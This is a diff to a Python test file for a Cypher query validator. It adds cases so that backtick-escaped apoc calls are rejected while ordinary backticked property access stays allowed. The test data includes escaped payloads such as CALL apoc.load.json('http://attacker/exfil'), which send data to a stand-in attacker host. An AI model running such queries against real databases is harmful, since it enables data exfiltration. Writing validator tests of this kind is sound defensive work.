@@ -125,6 +125,8 @@ BACKTICKED_DANGEROUS = [
     "CALL `db`.schema.visualization()",
     "CALL `apoc`.`load`.`json`('http://attacker/exfil')",
     "CALL apoc.`load`.json('http://attacker/exfil')",
+    # apoc functions are callable in expressions, not only after CALL.
+    "RETURN `apoc`.text.join(['a'], ',')",
 ]
 
 
@@ -148,6 +150,12 @@ def test_backticked_procedure_namespace_is_rejected(query: str, is_write: bool) 
         # A dangerous-looking name inside a string literal is still inert.
         "MATCH (n:Person) WHERE n.name = 'apoc.load.json' RETURN n",
         "MATCH (n) RETURN n // CALL apoc.load.json",
+        # A back-ticked name AFTER a dot is a property / map key, never the
+        # head of a procedure namespace, so it must stay exempt. Unescaping it
+        # would reject ordinary map access on a key named `apoc` or `dbms`.
+        "WITH {apoc: {name: 'x'}} AS n RETURN n.`apoc`.name",
+        "MATCH (n) RETURN n.`dbms`.version",
+        "MATCH (n) RETURN n.`db`.schema",
     ],
 )
 def test_backticked_names_do_not_cause_false_positives(query: str) -> None:
